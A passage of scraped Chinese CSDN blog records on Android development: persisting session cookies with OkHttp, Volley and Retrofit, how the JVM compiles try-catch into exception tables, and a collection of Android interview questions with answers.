.build();\n\n可以看到 ， 这个第三方自动帮我们保存了cookies，如果我们想获取，通过SharedPrefsCookiePersistor类的loadAll方法即可获取cookies。\n\n\n\nOkhttp和Okhttp3通用持久化方法\n\n对于这一种方法 ，实际上就是添加拦截器，创建一个类实现Interceptor接口，该方法我们可以获取自动保存cookies，并且给head设置cookies，自由度较大。比如下代码：\n\n\n\npackage com.app.test.brigdeproject.intercptor;\n\nimport com.squareup.okhttp.Interceptor;\nimport com.squareup.okhttp.Response;\n\nimport java.io.IOException;\nimport java.util.HashSet;\nimport java.util.List;\n\n/**\n * This Interceptor add all received Cookies to the app DefaultPreferences.\n * Your implementation on how to save the Cookies on the Preferences MAY VARY.\n * \n * Created by ${liumengqiang} on 2017/8/8.\n */\n\npublic class ReceivedCookiesInterceptor implements Interceptor {\n    @Override\n    public Response intercept(Chain chain) throws IOException {\n        Response originalResponse = chain.proceed(chain.request());\n        List<String> cookieList =  originalResponse.headers(\"Set-Cookie\");\n        if(cookieList != null) {\n            for(String s:cookieList) {//Cookie的格式为:cookieName=cookieValue;path=xxx\n                //保存你需要的cookie数据\n            }\n        }\n\n        return originalResponse;\n    }\n}\n\n欢迎各位小伙伴指正。\n\n以下文章借鉴： \nhttp://blog.csdn.net/lyhhj/article/details/51345386#reply \nhttp://blog.csdn.net/lyhhj/article/details/51345386 \nhttp://www.cnblogs.com/zhujiabin/p/6207913.html \nhttp://blog.csdn.net/qq_32583189/article/details/53819286", "time": "2018_08_14_11_13_11", "link": "https://blog.csdn.net/lmq121210/article/details/77006184", "title": "android Okhttp和OkHttp3持久化cookie"}
{"timestamp": "2018_08_14_11_13_11", "desc": "Android网络请求中Cookie的持久化\n\n以下有两种方法\n\n\n第一种方法是针对Volley来实现的，这种方法比较简单，但是对于有多重类型的Request必须都要按照这种方式来处理，耦合度比较高。\n第二种方法只要设置一次，之后所有的请求都会携带cookie。建议采用第二种方法\n\n\n\n\n第一种方式：通过自定义Request对象来处理\n\nRequest对象是一个抽象类，其中有两个抽象方法。\n\n\nabstract protected Response parseNetworkResponse(NetworkResponse response)\nabstract protected void deliverResponse(T response)  不需要操作该方法\n\n\n这两个方法经常被我们用来实现自定义的Request对象，而如果要实现Cookie的自定义这两个方法我们只需要使用到 第一个方法 parseNetworkResponse 和 public Map<String, String> getHeaders() throws AuthFailureError方法。\n\n\n\nimport com.android.volley.AuthFailureError;\nimport com.android.volley.NetworkResponse;\nimport com.android.volley.Request;\nimport com.android.volley.Response;\n\nimport java.util.Map;\n\npublic class CustomStringRequest extends Request<String>{\n\n\n    public CustomStringRequest(String url, Response.ErrorListener listener) {\n        super(url, listener);\n    }\n\n    public CustomStringRequest(int method, String url, Response.ErrorListener listener) {\n        super(method, url, listener);\n    }\n\n\n       @Override\n    protected Response<String> parseNetworkResponse(NetworkResponse response) {\n\n            //在这里可以的到 response 对象， 然后从response的header中获取cookie信息\n            if (headers.containsKey(SET_COOKIE_KEY)\n                && headers.get(SET_COOKIE_KEY).startsWith(SESSION_COOKIE)) {\n                String cookie = headers.get(SET_COOKIE_KEY);\n                if (cookie.length() > 0) {\n                    String[] splitCookie = cookie.split(\";\");\n                    String[] splitSessionId = splitCookie[0].split(\"=\");\n                    cookie = splitSessionId[1];\n\n                    //将得到的cookie存储到Sharepreference中\n                    Editor prefEditor = _preferences.edit();\n                    prefEditor.putString(SESSION_COOKIE, cookie);\n                    prefEditor.commit();\n                }\n            }\n        //------------------end-----------------------\n\n        //加上自己的其他逻辑代码\n\n        return null;\n    }\n\n     @Override\n    public Map<String, String> getHeaders() throws AuthFailureError {\n\n            Map<String, String> headers = super.getHeaders();\n\n        if (headers == null\n                || headers.equals(Collections.emptyMap())) {\n            headers = new HashMap<String, String>();\n        }\n\n        //从Sharepreference中获取到cookie，并把cookie添加到header中\n\n        String sessionId = _preferences.getString(SESSION_COOKIE, \"\");\n        if (sessionId.length() > 0) {\n            StringBuilder builder = new StringBuilder();\n            builder.append(SESSION_COOKIE);\n            builder.append(\"=\");\n            builder.append(sessionId);\n            if (headers.containsKey(COOKIE_KEY)) {\n                builder.append(\"; \");\n                builder.append(headers.get(COOKIE_KEY));\n            }\n            headers.put(COOKIE_KEY, builder.toString());\n        }\n            //-----------------end-------------------------\n\n        return headers;\n\n        //return super.getHeaders();\n    }\n\n\n\n    @Override\n    protected void deliverResponse(String response) {\n\n    }\n}\n\n\n\n通过在 parseNetworkResponse 和 getHeaders方法的自定义，就可以实现Request请求携带Cookie参数。\n\n\n\n第二种方式：CookieManager 和自定义的CookieStore\n\nCookieManager会帮我们管理本地Java应用的cookie，我们只需要实现自定义 CookieStore就能实现持久化的Cookie。\n\n关于CookieManager的介绍和 CookieStore的自定义可以参考另外一篇文章。Android中Cookie的使用\n\n晚上也会有一些实现好了的PersistCookieStore比如 这个\n\n下面给出一个已经实现的自定义的持久化CookieStore\n\n\n\n\npublic class PersistentCookieStore implements CookieStore {\n\n    private static final String LOG_TAG = \"PersistentCookieStore\";\n    private static final String COOKIE_PREFS = \"CookiePrefsFile\";\n    private static final String COOKIE_NAME_PREFIX = \"cookie_\";\n\n    private final HashMap<String, ConcurrentHashMap<String, HttpCookie>> cookies;\n    private final SharedPreferences cookiePrefs;\n\n    /**\n     * Construct a persistent cookie store.\n     *\n     * @param context Context to attach cookie store to\n     */\n    public PersistentCookieStore(Context context) {\n        cookiePrefs = context.getSharedPreferences(COOKIE_PREFS, 0);\n        cookies = new HashMap<String, ConcurrentHashMap<String, HttpCookie>>();\n\n        // Load any previously stored cookies into the store\n        Map<String, ?> prefsMap = cookiePrefs.getAll();\n        for(Map.Entry<String, ?> entry : prefsMap.entrySet()) {\n            if (((String)entry.getValue()) != null && !((String)entry.getValue()).startsWith(COOKIE_NAME_PREFIX)) {\n                String[] cookieNames = TextUtils.split((String)entry.getValue(), \",\");\n                for (String name : cookieNames) {\n                    String encodedCookie = cookiePrefs.getString(COOKIE_NAME_PREFIX + name, null);\n                    if (encodedCookie != null) {\n                        HttpCookie decodedCookie = decodeCookie(encodedCookie);\n                        if (decodedCookie != null) {\n                            if(!cookies.containsKey(entry.getKey()))\n                                cookies.put(entry.getKey(), new ConcurrentHashMap<String, HttpCookie>());\n                            cookies.get(entry.getKey()).put(name, decodedCookie);\n                        }\n                    }\n                }\n\n            }\n        }\n    }\n\n    @Override\n    public void add(URI uri, HttpCookie cookie) {\n        String name = getCookieToken(uri, cookie);\n\n        // Save cookie into local store, or remove if expired\n        if (!cookie.hasExpired()) {\n            if(!cookies.containsKey(uri.getHost()))\n                cookies.put(uri.getHost(), new ConcurrentHashMap<String, HttpCookie>());\n            cookies.get(uri.getHost()).put(name, cookie);\n        } else {\n            if(cookies.containsKey(uri.toString()))\n                cookies.get(uri.getHost()).remove(name);\n        }\n\n        // Save cookie into persistent store\n        SharedPreferences.Editor prefsWriter = cookiePrefs.edit();\n        prefsWriter.putString(uri.getHost(), TextUtils.join(\",\", cookies.get(uri.getHost()).keySet()));\n        prefsWriter.putString(COOKIE_NAME_PREFIX + name, encodeCookie(new SerializableHttpCookie(cookie)));\n        prefsWriter.apply();\n    }\n\n    protected String getCookieToken(URI uri, HttpCookie cookie) {\n        return cookie.getName() + cookie.getDomain();\n    }\n\n    @Override\n    public List<HttpCookie> get(URI uri) {\n        ArrayList<HttpCookie> ret = new ArrayList<HttpCookie>();\n        if(cookies.containsKey(uri.getHost()))\n            ret.addAll(cookies.get(uri.getHost()).values());\n        return ret;\n    }\n\n    @Override\n    public boolean removeAll() {\n        SharedPreferences.Editor prefsWriter = cookiePrefs.edit();\n        prefsWriter.clear();\n        prefsWriter.apply();\n        cookies.clear();\n        return true;\n    }\n\n\n    @Override\n    public boolean remove(URI uri, HttpCookie cookie) {\n        String name = getCookieToken(uri, cookie);\n\n        if(cookies.containsKey(uri.getHost()) && cookies.get(uri.getHost()).containsKey(name)) {\n            cookies.get(uri.getHost()).remove(name);\n\n            SharedPreferences.Editor prefsWriter = cookiePrefs.edit();\n            if(cookiePrefs.contains(COOKIE_NAME_PREFIX + name)) {\n                prefsWriter.remove(COOKIE_NAME_PREFIX + name);\n            }\n            prefsWriter.putString(uri.getHost(), TextUtils.join(\",\", cookies.get(uri.getHost()).keySet()));\n            prefsWriter.apply();\n\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    @Override\n    public List<HttpCookie> getCookies() {\n        ArrayList<HttpCookie> ret = new ArrayList<HttpCookie>();\n        for (String key : cookies.keySet())\n            ret.addAll(cookies.get(key).values());\n\n        return ret;\n    }\n\n    @Override\n    public List<URI> getURIs() {\n        ArrayList<URI> ret = new ArrayList<URI>();\n        for (String key : cookies.keySet())\n            try {\n                ret.add(new URI(key));\n            } catch (URISyntaxException e) {\n                e.printStackTrace();\n            }\n\n        return ret;\n    }\n\n    /**\n     * Serializes Cookie object into String\n     *\n     * @param cookie cookie to be encoded, can be null\n     * @return cookie encoded as String\n     */\n    protected String encodeCookie(SerializableHttpCookie cookie) {\n        if (cookie == null)\n            return null;\n        ByteArrayOutputStream os = new ByteArrayOutputStream();\n        try {\n            ObjectOutputStream outputStream = new ObjectOutputStream(os);\n            outputStream.writeObject(cookie);\n        } catch (IOException e) {\n            L.d(LOG_TAG, \"IOException in encodeCookie \" + e.toString());\n            return null;\n        }\n\n        return byteArrayToHexString(os.toByteArray());\n    }\n\n    /**\n     * Returns cookie decoded from cookie string\n     *\n     * @param cookieString string of cookie as returned from http request\n     * @return decoded cookie or null if exception occured\n     */\n    protected HttpCookie decodeCookie(String cookieString) {\n        byte[] bytes = hexStringToByteArray(cookieString);\n        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);\n        HttpCookie cookie = null;\n        try {\n            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);\n            cookie = ((SerializableHttpCookie) objectInputStream.readObject()).getCookie();\n        } catch (IOException e) {\n            L.d(LOG_TAG, \"IOException in decodeCookie \" + e.toString());\n        } catch (ClassNotFoundException e) {\n            L.d(LOG_TAG, \"ClassNotFoundException in decodeCookie \" + e.toString());\n        }\n\n        return cookie;\n    }\n\n    /**\n     * Using some super basic byte array &lt;-&gt; hex conversions so we don't have to rely on any\n     * large Base64 libraries. Can be overridden if you like!\n     *\n     * @param bytes byte array to be converted\n     * @return string containing hex values\n     */\n    protected String byteArrayToHexString(byte[] bytes) {\n        StringBuilder sb = new StringBuilder(bytes.length * 2);\n        for (byte element : bytes) {\n            int v = element & 0xff;\n            if (v < 16) {\n                sb.append('0');\n            }\n            sb.append(Integer.toHexString(v));\n        }\n        return sb.toString().toUpperCase(Locale.US);\n    }\n\n    /**\n     * Converts hex values from strings to byte arra\n     *\n     * @param hexString string of hex-encoded values\n     * @return decoded byte array\n     */\n    protected byte[] hexStringToByteArray(String hexString) {\n        int len = hexString.length();\n        byte[] data = new byte[len / 2];\n        for (int i = 0; i < len; i += 2) {\n            data[i / 2] = (byte) ((Character.digit(hexString.charAt(i), 16) << 4) + Character.digit(hexString.charAt(i + 1), 16));\n        }\n        return data;\n    }\n}\n\n\n这个CookieStore内部也是通过Sharepreference来实现cookie的持久化的。 \n现在定制好了自己的CookieStore，如何来进行设置然后使其生效呢？\n\n\n\n\n      //init for api client sync cookie\n        manager = new CookieManager(\n                new PersistentCookieStore(context),\n                CookiePolicy.ACCEPT_ALL);\n        CookieHandler.setDefault(manager);\n\n\n只要在网络请求之前调用这个方法，就可以将自定义的CookieStore设置到CookieManager中，CookieManager会在之后的HTTP请求中自动的帮我们处理response中cookie。\n\n建议中Application启动的时候调用上面的设置代码。\n\nCookiePolicy也是可以进行自定义的，详细可以参考另外一边文章。Android中Cookie的使用", "time": "2018_08_14_11_13_11", "link": "https://blog.csdn.net/u010940300/article/details/51444909", "title": "Android中Cookie的持久化（包含Volley的Cookie持久化）"}
{"timestamp": "2018_08_14_11_13_11", "desc": "前几天看到一条阿里巴巴的面试题：你了解try-catch块的实现原理吗？ \n我服，阿里的面试题就是有深度啊。要答好这一题，我觉得需要反编译一下.java源文件，因为字节码面前了无秘密。\n\n反编译一段小程序\n\n为了简单起见，我搞了一段没什么实际意义的try-catch示例代码。\n\npublic class Main {\n    public static void main(String[] args) {\n        int a = 1;\n        int b = 3;\n        try {\n            b = a + b;\n            return;\n        } catch (RuntimeException e1) {\n            b = a - b;\n        } catch (Exception e2) {\n            b = a * b;\n        } finally {\n            a = 0;\n        }\n    }\n}\n\n通过命令javap -c Main 反编译.class文件得到一下输出：\n\n  public static void main(java.lang.String[]);\n    Code:\n       0: iconst_1\n       1: istore_1 // 给局部变量表1号slot赋值为1，代表a\n       2: iconst_3\n       3: istore_2 // 给局部变量表2号slot赋值为3，代表b\n       4: iload_1  // try块开始！\n       5: iload_2\n       6: iadd\n       7: istore_2 // 指令4-7 完成了操作：b = a + b\n       8: iconst_0 // finally块开始！\n       9: istore_1 // 指令8-9 完成操作a=0\n      10: return // 函数执行完毕，返回\n      11: astore_3 // RuntimeException e1异常处理块开始！\n      12: iload_1\n      13: iload_2\n      14: isub\n      15: istore_2\n      16: iconst_0 // finally处理块\n      17: istore_1\n      18: goto          38 // RuntimeException e1异常处理块结束！\n      21: astore_3 // Exception e2异常处理块开始！\n      22: iload_1\n      23: iload_2\n      24: imul\n      25: istore_2\n      26: iconst_0 // finally处理块\n      27: istore_1\n      28: goto          38 // Exception e2 异常处理块结束！\n      31: astore        4 // 其他任何异常处理块\n      33: iconst_0\n      34: istore_1\n      35: aload         4\n      37: athrow // 往将异常外抛\n      38: return\n    Exception table: // 异常表\n       from    to  target type\n           4     8    11   Class java/lang/RuntimeException //4-8 号指令中，碰到 NullPointerException时，跳到 11 号指令\n           4     8    21   Class java/lang/Exception\n           4     8    31   any\n          11    16    31   any\n          21    26    31   any\n          31    33    31   any\n}\n\n以上指令的注释是我加上去的，请大家对照源码加以理解。\n\n\n\n总结\n\n如果大家看完之后仍然有点模糊，相信看了下图后会对try-catch代码对应的字节码指令结构有一个全面的理解。 \n\n\ntry块的范围就是体现在异常表行记录的起点和终点。JVM 在 try 住的代码区间内如有异常抛出的话，就会在当前栈桢的异常表中，找到匹配类型的异常记录的入口指令号，然后跳到该指令处执行。异常指令块执行完后，再回来继续执行后面的代码。JVM 按照每个入口在表中出现的顺序进行检索，如果没有发现匹配的项，JVM 将当前栈帧从栈中弹出，再次抛出同样的异常。当 JVM 弹出当前栈帧时，JVM 马上终止当前方法的执行，并且返回到调用本方法的方法中，但是并非继续正常执行该方法，而是在该方法中抛出同样的异常，这就使得 JVM 在该方法中再次执行同样的搜寻异常表的操作。\n\n参考：JVM 对 Java 异常的处理原理", "time": "2018_08_14_11_13_11", "link": "https://blog.csdn.net/TellH/article/details/70940757", "title": "从字节码角度理解JVM异常处理机制的原理"}
{"timestamp": "2018_08_14_11_13_11", "desc": "最近遇到一些比较有代表性,有点挑战性的面试题, \n大概集中这4个方面:\n\n\n1.性能的优化\n2.功能的实现原理\n3.基础知识的掌握程度\n4.新技术的了解\n\n\n关于这些问题,觉得下面几篇无论是文章的逻辑,文章的深度都是写得比较好的,希望对一些应聘者有所帮助.\n\n\n\n1. JNI 的调用怎么做优化?\n\n\n思路: \n在 Java 中声明一个 native 方法，然后生成本地接口的函数原型声明，再用 C/C++ 实现这些函数，并生成对应平台的动态共享库放到 Java 程序的类路径下，最后在 Java 程序中调用声明的 native 方法就间接的调用到了 C/C++ 编写的函数了，在 C/C++ 中写的程序可以避开 JVM 的内存开销过大的限制、处理高性能的计算、调用系统服务等功能.\n遇到的问题: \n其实在JNI中,与java最常接触的无非就是查找 class 和 ID (属性和方法 ID),但是这个查找的过程是十分消耗时间的.\n解决方法: \n因此在 native 里保存 class 和 member id 是很有必要的,但是class 和 member id 在一定范围内是稳定的，但在动态加载的 class loader 下，保存全局的 class 要么可能失效，要么可能造成无法卸载classloader,在诸如 OSGI(j2e的东西,自己百度) 框架下的 JNI 应用还要特别注意这方面的问题.\n\n\n总结: \n所以在 JNI 开发中，合理的使用缓存技术能给程序提高极大的性能。缓存有两种，分别为使用时缓存和类静态初始化时缓存，区别主要在于缓存发生的时刻。\n\n\n使用时缓存: \n字段 ID、方法 ID 和 Class 引用在函数当中使用的同时就缓存起来. \n判断字段 ID 是否已经缓存，如果没有先取出来存到fid_str中，下次再调用的时候该变量已经有值了，不用再去JVM中获取，起到了缓存的作用。\n\n\n  遇到的坑: \n  但是请注意：cls_string是一个局部引用，与方法和字段 ID 不一样，局部引用在函数结束后会被 JVM 自动释放掉，这时cls_string成为了一个野针对（指向的内存空间已被释放，但变量的值仍然是被释放后的内存地址，不为 NULL），当下次再调用 Java_com_xxxx_newString 这个函数的时候，会试图访问一个无效的局部引用，从而导致非法的内存访问造成程序崩溃。所以在函数内用 static 缓存局部引用这种方式是错误的。\n\n类静态初始化时缓存: \n在调用一个类的方法或属性之前，Java 虚拟机会先检查该类是否已经加载到内存当中，如果没有则会先加载，然后紧接着会调用该类的静态初始化代码块，所以在静态初始化该类的过程当中计算并缓存该类当中的字段 ID 和方法 ID 也是个不错的选择。\n\n\n\n\n两种缓存方式比较\n\n如果在写 JNI 接口时，不能控制方法和字段所在类的源码的话，用使用时缓存比较合理。但比起类静态初始化时缓存来说，用使用时缓存有一些缺点：\n\n使用前，每次都需要检查是否已经缓存该 ID 或 Class 引用 \n如果在用使用时缓存的 ID，要注意只要本地代码依赖于这个 ID 的值，那么这个类就不会被 unload。另外一方面，如果缓存发生在静态初始化时，当类被 unload 或 reload 时，ID 会被重新计算。因为，尽量在类静态初始化时就缓存字段 ID、方法 ID 和类的 Class 引用。\n\n点击详情\n\n\n\n2. 自定义View的一个绘制流程(底层)\n\n\n\n自定义控件过程\n\n自定义控件的流程大致分为以下几步\n\n\n定义属性\n定义xml文件\n自定义View获取属性\nonMeasure()\nonLayout() \n自定义view的目的是为了提升我们的视觉体验，所以一般我们会辅助一些动画来提升体验，为了增强交互，我们也要为其增加一些交互，所以我么需要对其中进行一些事件的监听，自定义监听器，然后在我们需要的地方进行回调，考虑完这些，我们需要再考虑的是如何提高这些view的复用性。\n\n\n\n\nView的绘制流程\n\n\nOnMeasure\nOnLayout\nOnDraw \n对于自定义View，我们通常会重写这三个方法，重写那些，取决于我们的自定义View从哪里继承，然后要实现什么样的功能。大致归纳有以下几点。\n继承View \n实现一些不规则的图形，需要重写onDraw方法进行绘制\n继承ViewGroup \n需要实现对于子控件的测量和布局\n继承特定View \n较容易实现\n继承特定ViewGroup \n无需处理测量和布局 \n点击详情1 \n点击详情2\n\n\n\n\n3. 非静态内部类为什么会持有外部类的引用\n\n通过反编译的结果, 普通的非static内部类比static内部类多了一个field: final com.qihoo.browser.OuterClass this$0;在默认的构造方法中,用外部类的对象对这个filed赋值. \n用intellijidea打开OuterClass$NormallInnerClass.class, 可以看到内部类调用外部类的方法就是通过这个filed实现的. 这也就是static 内部类无法调用外部类普通方法的原因，因为static内部类中没有这个field: final com.qihoo.browser.OuterClass this$0;\n\n解决方法\n\n\n\npublicclass MainActivity extends Activity {  \n  privateMyThread mThread;  \n\n  @Override  \n  protectedvoid onCreate(Bundle savedInstanceState) {  \n    super.onCreate(savedInstanceState);  \n    exampleThree();  \n  }  \n\n  privatevoid exampleThree() {  \n    mThread = new MyThread();  \n    mThread.start();  \n  }  \n\n//static内部类可以避免,持有外部类的引用.\n  private static class MyThread extends Thread {  \n    private boolean mRunning = false;  \n\n    @Override  \n    public void run() {  \n    //对一些死循环的耗时操作,需要设置退出线程的标识 flag\n      mRunning = true;  \n      while(mRunning) {  \n        SystemClock.sleep(1000);  \n      }  \n    }  \n\n   //定义一个flag 来停止线程的运行.\n    public void close() {  \n      mRunning = false;  \n    }  \n  }  \n\n  @Override  \n  protected void onDestroy() {  \n    super.onDestroy();  \n    //activity被销毁的时候关闭线程\n    mThread.close();  \n  }  \n}  \n\n点击详情1 \n点击详情2\n\n\n\n4. 静态方法为什么不能被重写\n\n\n非静态方法 按重写规则调用相应的类实现方法，而静态方法只与类相关。\n所谓静态，就是在运行时，虚拟机已经认定此方法属于哪个类。 \n专业术语有严格的含义,用语要准确.”重写”只能适用于实例方法.不能用于静态方法.对于静态方法,只能隐藏(可以重写那只是形式上的 ，并不满足多态的特征，所以严格说不是重写)。\n静态方法的调用不需要实例化吧..  不实例化也就不能用多态了，也就没有所谓的父类引用指向子类实例.因为不能实例化 也就没有机会去指向子类的实例。所以也就不存在多态了。\n\n\n\n  静态方法不依赖类就可以访问。这就是它的用途啊，没有new对象可调用的方法。然而，重写是依赖对象的。重写父类的某一方法，而static不依赖类。\n\n\n\n\n5. listView放100个布局,如何做优化(全部加载) 想显示就显示,不显示就不显示\n\n善用自定义 View，自定义 View 可以有效的减小 Layout 的层级。\n\n\n\n5.1 listView的终极优化(推荐)\n\n包括利用好 ConvertView、利用好 ViewType、Layout 层次结构、ViewHolder、使用自定义布局、保证 Adapter 的 hasStableIds() 返回 true、Item 不能太高、getView() 中要做尽量少的事情、ListView 中元素避免半透明、尽量开启硬件加速、 AnimationCache、 ScrollingCache 和 SmoothScrollbar。\n\n个人收获: \n比viewHolder更有效的方式是使用自定义布局, \n自定义布局有个好处就是可以省略 ViewHolder。说出来可能你不会信， ViewHolder 首先会占用 setTag() ，其次每次取出后都需要转换一下类的类型。如果是自定义布局的话，findViewById() 这个过程可以在构造函数中进行.\n\n点击详情\n\n\n\n6. view和surfaceView的区别\n\nAndroid游戏开发中主要的类除了控制类就是显示类，比较重要也很复杂的就是显示和游戏逻辑的处理。在J2ME中可以通过Display和Canvas来实现显示，而Android中处理显示的是View类。下面为大家简单介绍android.view.View和android.view.SurfaceView。 \n       SurfaceView是从View基类中派生出来的显示类，直接子类有GLSurfaceView和VideoView，可以看出GL和视频播放以及Camera摄像头一般均使用SurfaceView，到底有哪些优势呢? SurfaceView可以控制表面的格式，比如大小，显示在屏幕中的位置，最关键是的提供了SurfaceHolder类，使用getHolder方法获取，相关的有Canvas  lockCanvas()、  Canvas  lockCanvas(Rect dirty)  、void  removeCallback(SurfaceHolder.Callback callback)、void  unlockCanvasAndPost(Canvas canvas)控制图形以及绘制，而在SurfaceHolder.Callback 接口回调中可以通过下面三个抽象类可以自己定义具体的实现（比如第一个更改格式和显示画面）：\n\n       abstract void  surfaceChanged(SurfaceHolder holder, int format, int width, int height) ;\n       abstract void  surfaceCreated(SurfaceHolder holder) ;\n       abstract void  surfaceDestroyed(SurfaceHolder holder) ;\n\n   对于Surface相关的，Android底层还提供了GPU加速功能，所以一般实时性很强的应用中主要使用SurfaceView而不是直接从View构建，同时后面会讲到的OpenGL中的GLSurfaceView也是从该类实现。\n\n\n7. 蓝牙\n\n点击详情\n\n\n\n8. 说说你比较熟悉的一个开源框架的 (源码流程)\n\nOkHttp + volley\n\n\n\nOKHttp的优点\n\n\nOKHttp是Android版Http客户端。非常高效，支持SPDY、连接池、GZIP和HTTP缓存。 \n一种开放的网络传输协议，由Google开发），它为你做了很多的事情。\nOkHttp实现的诸多技术如：连接池，gziping，缓存等。\nOkHttp使用Okio来大大简化数据的访问与存储，Okio是一个增强 java.io 和 java.nio的库。\nOkHttp 处理了很多网络疑难杂症：会从很多常用的连接问题中自动恢复。如果您的服务器配置了多个IP地址，当第一个IP连接失败的时候，OkHttp会自动尝试下一个IP。\nOkHttp还处理了代理服务器问题和SSL握手失败问题。 \n*目前，该封装库志支持：\n\n一般的get请求\n一般的post请求\n基于Http的文件上传\n文件下载\n上传下载的进度回调\n加载图片\n支持请求回调，直接返回对象、对象集合\n支持session的保持\n支持自签名网站https的访问，提供方法设置下证书就行\n支持取消某个请求   \n\n\n\n\nVolley\n\n\nVolley是一个简化网络任务的库。他负责处理请求，加载，缓存，线程，同步等问题。它可以处理JSON，图片，缓存，文本源，支持一定程度的自定义。\nVolley在Android 2.3及以上版本，使用的是HttpURLConnection，而在Android 2.2及以下版本，使用的是HttpClient。\nVolley存在一个缓存线程，一个网络请求线程池(默认4个线程)。\n它的设计目标就是非常适合去进行数据量不大，但通信频繁的网络操作，而对于大数据量的网络操作，比如说下载文件等，Volley的表现就会非常糟糕\nVolley的优点很多，可拓展、结构合理、逻辑清晰、能识别缓存、通过统一的方式，获取网络数据，包括且不限于文本、图片等资源。\nVolley在一开始创建请求队列的过程中，需要创建网络线程和缓存线程，同时还需要初始化基于Disk的缓存，这中间有大量的资源开销和IO操作，所有才会慢。\n\n\n\n\n9. 现在市面上常用的适配\n\n点击详情\n\n\n\n10. 子线程创建的handler ，可以调用应用本身维护的handler的方法吗\n\n一个Handler的创建它就会被绑定到这个线程的消息队列中，如果是在主线程创建的，那就不需要写代码来创建消息队列了，默认的消息队列会在主线程被创建。但是如果是在子线程的话，就必须在创建Handler之前先初始化线程的消息队列。\n\n点击详情\n\n\n\n11. fragment 中替换和添加的区别.哪个有优势.\n\ntransaction.replace() \n使用另一个Fragment替换当前的，实际上就是remove()然后add()的合体\n\n\ntransaction.replace() fragment生命周期会重走.\ntransaction.add()  当使用add(),show(),hide()跳转新的Fragment时，旧的Fragment回调onHiddenChanged()，不会回调onStop()等生命周期方法，而新的Fragment在创建时是不会回调onHiddenChanged()，这点要切记.\n\n\n点击详情", "time": "2018_08_14_11_13_11", "link": "https://blog.csdn.net/relicemxd/article/details/52586962", "title": "最近收集的一些面试题"}
{"timestamp": "2018_08_14_11_13_11", "desc": "绪论\n\n最近小编有点忙啊，项目比较紧，所以一直在忙活项目，继之前的自定义组件之后就没再写博客了，如果你没看到之前的自定义组件你可以看一下： \nAndroid自定义下拉刷新动画–仿百度外卖下拉刷新 \nAndroid自定义组合控件—教你如何自定义下拉刷新和左滑删除 \n效果还行，源码也已经传到我的Github上了。 \n那么今天小编来给大家分享点什么呢？对，就是它：Retrofit，话说Retrofit最近真的很火啊，Retrofit+OKHttp现在似乎已经成为了Android网络请求框架的主流框架了吧，小编之前用的是XUtils框架，个人感觉也不错，也更新到了Xutils3，但是毕竟Retrofit是Square出的，所以小编还是忍不住需要探索一下。 \n鉴于现在Retrofit现在网上很多教程，所以基本的使用方法就不介绍了，小编也不重复造轮子了，如果你还不会用，看看下面几篇文章： \nRetrofit 2.0使用详解，配合OkHttp、Gson，Android最强网络请求框架 \nRetrofit 2.0：有史以来最大的改进 \nRetrofit初探和简单使用\n\n持久化Cookie\n\n今天小编要讲的是，怎么持久化管理你的Cookie，也就是实现用户免登陆过程。 \n首先说一下需求，后台大哥哥是这样告诉我的：我们的用户登录需要你在本地管理cookie，用户下次进来的时候不需要再登录，调用其他接口的时候将用户的cookie和session放到请求头里面。我果断的答应了，因为之前用Xutils的时候也这么做过，当我去网上找资料的时候发现并没有很好的资料。因为Retrofit内部是Ok来实现的，所以方向可以找到Ok管理Cookie，好了，方向找到了，我们来看一下OKHttp： \nOKHttp3.0之前和之后有很大的改动： \n3.0之前：\n\n\n\nprivate Request networkRequest(Request request) throws IOException {\n  Request.Builder result = request.newBuilder();\n\n  //例行省略....\n\n  CookieHandler cookieHandler = client.getCookieHandler();\n  if (cookieHandler != null) {\n    // Capture the request headers added so far so that they can be offered to the CookieHandler.\n    // This is mostly to stay close to the RI; it is unlikely any of the headers above would\n    // affect cookie choice besides \"Host\".\n    Map<String, List<String>> headers = OkHeaders.toMultimap(result.build().headers(), null);\n\n    Map<String, List<String>> cookies = cookieHandler.get(request.uri(), headers);\n\n    // Add any new cookies to the request.\n    OkHeaders.addCookies(result, cookies);\n  }\n\n  //例行省略....\n\n  return result.build();\n}\n\n我们可以看到Request中是有CookieHandler的，通过client.getCookieHandler()函数获得了CookieHandler对象，通过该对象拿到cookie并设置到请求头里，请求结束后取得响应后通过networkResponse.headers()函数将请求头获得传入receiveHeaders函数，并将取得的cookie存入getCookieHandler得到的一个CookieHandler对象中去。那么我们可以这样加：\n\n\n\nOkHttpClient client = new OkHttpClient();\nclient.setCookieHandler(CookieHandler cookieHanlder);\n\n3.0之后： \n3.0之后OKHttp是加了CookieJar和Cookie两个类的\n\n\n\nprivate Request networkRequest(Request request) throws IOException {\n    Request.Builder result = request.newBuilder();\n\n    //例行省略....\n\n    List<Cookie> cookies = client.cookieJar().loadForRequest(request.url());\n    if (!cookies.isEmpty()) {\n      result.header(\"Cookie\", cookieHeader(cookies));\n    }\n\n    //例行省略....\n\n    return result.build();\n  }\n\n\n\nprivate String cookieHeader(List<Cookie> cookies) {\n    StringBuilder cookieHeader = new StringBuilder();\n    for (int i = 0, size = cookies.size(); i < size; i++) {\n      if (i > 0) {\n        cookieHeader.append(\"; \");\n      }\n      Cookie cookie = cookies.get(i);\n      cookieHeader.append(cookie.name()).append('=').append(cookie.value());\n    }\n    return cookieHeader.toString();\n  }\n\n\n\npublic void receiveHeaders(Headers headers) throws IOException {\n    if (client.cookieJar() == CookieJar.NO_COOKIES) return;\n\n    List<Cookie> cookies = Cookie.parseAll(userRequest.url(), headers);\n    if (cookies.isEmpty()) return;\n\n    client.cookieJar().saveFromResponse(userRequest.url(), cookies);\n  }\n\n那么我们该怎么持久化管理呢?重点来了：\n\n\n\nOkHttpClient client = new OkHttpClient.Builder()\n    .cookieJar(new CookieJar() {\n        private final HashMap<HttpUrl, List<Cookie>> cookieStore = new HashMap<>();\n\n        @Override\n        public void saveFromResponse(HttpUrl url, List<Cookie> cookies) {\n            cookieStore.put(url, cookies);\n        }\n\n        @Override\n        public List<Cookie> loadForRequest(HttpUrl url) {\n            List<Cookie> cookies = cookieStore.get(url);\n            return cookies != null ? cookies : new ArrayList<Cookie>();\n        }\n    })\n    